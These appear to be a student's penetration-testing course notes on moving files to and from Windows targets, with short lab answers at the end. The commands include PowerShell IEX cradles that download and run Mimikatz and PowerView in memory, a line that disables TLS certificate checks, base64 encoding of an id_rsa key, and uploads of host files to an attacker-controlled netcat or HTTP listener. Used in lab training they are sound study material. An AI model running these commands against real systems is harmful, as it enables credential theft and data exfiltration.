# **Download Operations**
---
# PowerShell Base64 Encode & Decode - No Network
----
- We can ==**encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation,**== decoding the file in the original content.
- An essential step in using this method is to **ensure the file you encode and decode is correc**t. We can use [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html), a program that calculates and verifies 128-bit MD5 checksums.
- **Note:** Windows Command Line utility (cmd.exe) has a **maximum string length of 8,191 characters**. Also, a web shell may error if you attempt to send extremely large strings.

- Encode: 
	- `cat id_rsa |base64 -w 0;echo`
- Copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it:
	- `[IO.File]::WriteAllBytes("C:\Path\To\Save\File", [Convert]::FromBase64String("<CopiedBase64String>"))`
- Confirm MD5 hash:
	- `Get-FileHash C:\Path\Of\Saved\File -Algorithm md5`

# PowerShell Web Downloads
---
![[Pasted image 20250622064045.png]]
## PowerShell DownloadFile Method
---
- `(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')`
	- `(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')`
- `(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')` => ASync

## PowerShell DownloadString - Fileless Method
---
- Fileless attacks work by using some operating system functions to **download the payload and execute it directly**. 
- Instead of downloading a PowerShell script to disk, ==**we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.**==

- `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`

- `IEX` also accepts pipeline input:
	- `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`

## PowerShell Invoke-WebRequest
---
- `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1` => **Slower**


Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239).

# Common Errors with PowerShell
---
![[Pasted image 20250622064514.png]]
- This can be **bypassed using the parameter `-UseBasicParsing`**.
	- `Invoke-WebRequest https://<ip>/PowerView.ps1  -UseBasicParsing | IEX`

- Another error in PowerShell downloads is related to the **SSL/TLS secure channel** if the certificate is not trusted:
	- `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`
	- `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`

# SMB Downloads - port TCP/445
---
- Create the SMB Server:
	- `sudo impacket-smbserver share -smb2support /tmp/smbshare`
- download a file from the SMB server in current directory:
	- `copy \\192.168.220.133\share\nc.exe`
- Error: `You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.`
	- Windows block unauthenticated guest access
	- To transfer files in this scenario, **we can set a username and password using our Impacket SMB server and mount the SMB server** on our windows target machine:
		- `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
	- Mount using: 
		- `net use n: \\192.168.220.133\share /user:test test`

# FTP Downloads - port TCP/21 and TCP/20
---
- Install `pyftpdlib`:
	- `install pyftpdlib --break-system-packages `
- Setting up a Python3 FTP Server (by default, `pyftpdlib` uses port 2121):
	- `python3 -m pyftpdlib --port 21`
- Transfer Using:
	-  `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`
- ![[Pasted image 20250622065303.png]]

# **Upload Operations**
----
# PowerShell Base64 Encode & Decode
---
- Encode File Using PowerShell:
	- `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`
- Decode Base64 String in Linux:
	-  `echo copied_string | base64 -d` > file
	- `md5sum file` 

# PowerShell Web Uploads
---
- PowerShell doesn't have a built-in function for upload operations, **but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function.**
- We'll also need **a web server that accepts uploads,** which is not a default option in most common webserver utilities.

- Installing a Configured WebServer with Upload:
	- `pip3 install uploadserver`
	- `python3 -m uploadserver`
- Now we can use a PowerShell **script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)** which uses `Invoke-RestMethod` to perform the upload operations.
- Upload a File to Python Upload Server:
	-  `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`
	- `Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts`
	
# PowerShell Base64 Web Upload
---
- Using Invoke-WebRequest or Invoke-RestMethod together with Netcat.
- We use Netcat to listen in on a **port we specify and send the file as a `POST` request.**
	- `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`
	- `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`
- On attacker:
	- `nc -lvnp 8000`
	- `echo <base64> | base64 -d -w 0`

# SMB Uploads
---
- The `WebDAV` protocol **enables a webserver to behave like a fileserver,** supporting collaborative content authoring. `WebDAV` can also use HTTPS.
- When you use `SMB`, it will first attempt to connect using the SMB protocol, and **if there's no SMB share available, it will try to connect using HTTP.**

- Configuring WebDav Server:
	- `sudo pip3 install wsgidav cheroot`
- Using the WebDav Python module:
	- `wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`
- Connecting to the Webdav Share:
	-  `dir \\192.168.49.128\DavWWWRoot`
- **Note:** `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
- Uploading Files using SMB:
	- `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\`
	- `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\`
- **Note:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

# FTP Uploads
---
- Setup on Kali:
	- `python3 -m pyftpdlib --port 21 --write`
- PowerShell upload function to upload a file to our FTP Server:
	- `(New-Object Net.WebClient).UploadFile('ftp://10.10.15.93/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
	![[Pasted image 20250622070910.png]]

# **Labs**
----
=> Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer. 
- `wget http://10.129.201.55/flag.txt`

=>  Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.
- Normal python http-server

